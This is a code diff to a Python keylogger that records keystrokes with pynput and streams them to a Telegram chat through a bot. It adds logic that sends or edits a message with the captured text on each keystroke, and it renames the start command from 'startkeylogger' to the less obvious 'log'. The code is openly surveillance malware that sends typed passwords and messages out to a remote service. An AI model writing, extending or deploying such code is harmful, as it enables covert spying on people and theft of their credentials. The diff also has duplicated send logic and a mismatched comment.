@@ -26,16 +26,32 @@ def on_release(key, update):
     if key == Key.esc:
         return False
 
+    current_keystrokes = keystrokes  # Save the current state of keystrokes
+
     if hasattr(key, 'char') and key.char is not None:
         keystrokes += key.char
     elif key == Key.space:
         keystrokes += '\xa0'  # Replace space with non-breaking space
     elif key == Key.enter:
-        keystrokes += "\n"
+        keystrokes += "\n"  # Use Telegram line break tag
     elif key == Key.backspace:
         keystrokes = keystrokes[:-1]
 
     send_typing_action(update.message.chat_id)
+
+    # Inside the on_release function
+    if current_keystrokes != keystrokes:
+        if message_id is None:
+            # Send the initial message if keystrokes are not empty
+            if keystrokes:
+                msg = bot.send_message(
+                    update.message.chat_id, text=keystrokes, parse_mode=ParseMode.MARKDOWN)
+                message_id = msg.message_id
+        else:
+            # Edit the existing message if keystrokes are not empty
+            if keystrokes:
+                bot.edit_message_text(chat_id=update.message.chat_id, message_id=message_id,
+                                      text=keystrokes, parse_mode=ParseMode.MARKDOWN)
 
     if message_id is None:
         # Send the initial message if keystrokes are not empty
@@ -62,7 +78,7 @@ def keylogger(update, context):
 
 
 # Command to start the keylogger
-updater.dispatcher.add_handler(CommandHandler('startkeylogger', keylogger))
+updater.dispatcher.add_handler(CommandHandler('log', keylogger))
 
 # Send a message with typing action
 
